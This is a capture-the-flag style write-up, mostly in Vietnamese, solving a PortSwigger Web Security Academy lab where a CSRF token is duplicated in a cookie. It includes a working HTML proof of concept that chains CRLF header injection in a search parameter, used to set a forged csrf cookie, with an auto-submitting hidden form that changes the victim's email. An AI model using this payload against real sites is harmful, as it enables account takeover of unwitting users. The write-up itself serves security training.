### Web Academy PortSwigger
* Lab: [Lab: CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)
* Descript: This lab's email change functionality is vulnerable to CSRF. It attempts to use the insecure "double submit" CSRF prevention technique.
* To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
* Solved and Writeup by Me ^^!

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-11-30 232648](https://hackmd.io/_uploads/BkUliIUS6.png)

Truy c·∫≠p b√†i lab, ta c√≥ giao di·ªán nh∆∞ b√™n d∆∞·ªõi.
![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 015934](https://hackmd.io/_uploads/ryG3o8Ir6.png)

Sau khi ƒëƒÉng nh·∫≠p v·ªõi user wiener , ta th·ª±c hi·ªán thay ƒë·ªïi email v√† ch·∫∑n request ƒë·ªÉ ph√¢n t√≠ch :  
![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 020314](https://hackmd.io/_uploads/SJWs3LUHT.png)

---
![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 020335](https://hackmd.io/_uploads/HJy3n8LH6.png)
Ta th·∫•y csrf token c√≥ c·∫£ trong Head request v√† c·∫£ ph·∫ßn Body c·ªßa request v·ªõi c√πng m·ªôt gi√° tr·ªã. Send it to Repeater v√† ki·ªÉm tra.    

Ch·ªânh s·ª≠a session , v√† g·ª≠i , ta s·∫Ω b·ªã lock out kh·ªèi t√†i kho·∫£n hi·ªán t·∫°i : 

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 020859](https://hackmd.io/_uploads/S14HlDUBp.png)

Ch·ªânh s·ª≠a 1 gi√° tr·ªã csrf th√¨ tr·∫£ v·ªÅ Invalid CSRF Token , ch·ªânh s·ª≠a c·∫£ 2 th√¨ request ƒë∆∞·ª£c ch·∫•p nh·∫≠n :  

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 022123](https://hackmd.io/_uploads/SJiagv8B6.png)

Xem qua search function ,search th·ª≠ v√† test trong Repeater:  

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 022405](https://hackmd.io/_uploads/r1eOWPLHT.png)

Ta th·∫•y search term xu·∫•t hi·ªán trong ph·∫£n h·ªìi . Ta c√≥ √Ω t∆∞·ªüng break-out kh·ªèi d√≤ng v√† ch√®n Set-Cookie nh·∫±m s·ª≠a csrf token :  

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 022708](https://hackmd.io/_uploads/SJOXGvIBa.png)

Qu·∫£ nhi√™n , d·ªØ li·ªáu trong search term kh√¥ng ƒë∆∞·ª£c s√†ng l·ªçc , v√† trong response , ta th·∫•y Set-Cookie ƒë·∫∑t csrf=hahaü§î.

Th·ª±c hi·ªán t·∫°o html page attack v·ªõi CSRF PoC :  





```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://0a50007a04e367218348d74d007900c6.web-security-academy.net/my-account/change-email" method="POST">

      <input type="hidden" name="email" value="trantung15343@gmail.com" />

      <input type="hidden" name="csrf" value="olala" />

      <input type="submit" value="Submit request" />

    </form>

    <img src="https://0a50007a04e367218348d74d007900c6.web-security-academy.net/?search=Nothing%0d%0aSet-Cookie:%20csrf=olala" 

				 onerror="document.forms[0].submit()">

  </body>

</html>
```
Go to Exploit Server , paste and deliver to victim :  

![·∫¢nh ch·ª•p m√†n h√¨nh 2023-12-01 024646](https://hackmd.io/_uploads/BkwBwwLSa.png)

Lab ƒë√£ ƒë∆∞·ª£c gi·∫£i quy·∫øt , ta th·∫•y email ƒë√£ b·ªã thay ƒë·ªïi th√†nh trantung15343@gmail.comüòä.





